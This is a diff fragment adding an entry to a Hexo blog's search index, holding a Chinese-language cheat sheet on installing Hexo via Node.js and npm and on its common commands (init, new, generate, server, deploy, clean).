+    <content type="text"><![CDATA[安装安装Hexo前，需要安装Node.js和Git，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入1$ node -v 来测试Node.js是否成功安装，输入1$ npm -v 来测试npm是否成功安装。 npm成功安装后，可使用1$ npm install -g hexo-cli 来快速安装Hexo 参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于： 本地安装 将安装包放在 ./node_modules 下（运行npm时所在的目录） 可以通过 require() 来引入本地安装的包 全局安装 将安装包放在 /usr/local下 可以直接在命令行里使用 常用命令新建一个网站1$ hexo init [folder] 如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。 新建一篇文章1$ hexo n [layout] &lt;title&gt; 如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 生成静态文件1$ hexo g 启动服务预览1$ hexo s 部署网站1$ hexo d 清除缓存文件(db.json)和已生成的静态文件(public)。1$ hexo clean 在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。]]></content>
+      <categories>
+        <category>CheatSheet</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+</search>
